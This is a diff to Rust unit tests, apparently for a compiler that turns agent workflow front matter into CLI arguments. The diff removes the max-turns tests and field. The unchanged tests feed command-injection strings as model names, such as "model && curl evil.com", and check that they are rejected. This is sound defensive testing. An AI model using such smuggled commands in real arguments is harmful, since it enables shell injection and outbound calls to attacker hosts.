@@ -2393,23 +2393,6 @@ mod tests {
     }
 
     #[test]
-    fn test_engine_args_max_turns_ignored() {
-        let (fm, _) = parse_markdown(
-            "---\nname: test\ndescription: test\nengine:\n  model: claude-opus-4.5\n  max-turns: 50\n---\n",
-        )
-        .unwrap();
-        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
-        assert!(!params.contains("--max-turns"), "max-turns should not be emitted as a CLI arg");
-    }
-
-    #[test]
-    fn test_engine_args_no_max_turns_when_simple_engine() {
-        let fm = minimal_front_matter();
-        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
-        assert!(!params.contains("--max-turns"));
-    }
-
-    #[test]
     fn test_engine_args_no_max_timeout() {
         let (fm, _) = parse_markdown(
             "---\nname: test\ndescription: test\nengine:\n  model: claude-opus-4.5\n  timeout-minutes: 30\n---\n",
@@ -2424,16 +2407,6 @@ mod tests {
         let fm = minimal_front_matter();
         let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-timeout"));
-    }
-
-    #[test]
-    fn test_engine_args_max_turns_zero_not_emitted() {
-        let (fm, _) = parse_markdown(
-            "---\nname: test\ndescription: test\nengine:\n  model: claude-opus-4.5\n  max-turns: 0\n---\n",
-        )
-        .unwrap();
-        let params = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
-        assert!(!params.contains("--max-turns"), "max-turns should not be emitted as a CLI arg");
     }
 
     #[test]
@@ -3392,7 +3365,7 @@ mod tests {
             model: Some("model' && echo pwned".to_string()),
             version: None, agent: None, api_target: None,
             args: vec![], env: None, command: None,
-            max_turns: None, timeout_minutes: None,
+            timeout_minutes: None,
         });
         let result = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm));
         assert!(result.is_err());
@@ -3407,7 +3380,7 @@ mod tests {
             model: Some("model && curl evil.com".to_string()),
             version: None, agent: None, api_target: None,
             args: vec![], env: None, command: None,
-            max_turns: None, timeout_minutes: None,
+            timeout_minutes: None,
         });
         let result = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm));
         assert!(result.is_err());
@@ -3422,7 +3395,7 @@ mod tests {
                 model: Some(name.to_string()),
                 version: None, agent: None, api_target: None,
                 args: vec![], env: None, command: None,
-                max_turns: None, timeout_minutes: None,
+                timeout_minutes: None,
             });
             let result = CompileContext::for_test(&fm).engine.args(&fm, &crate::compile::extensions::collect_extensions(&fm));
             assert!(result.is_ok(), "Model name '{}' should be valid", name);
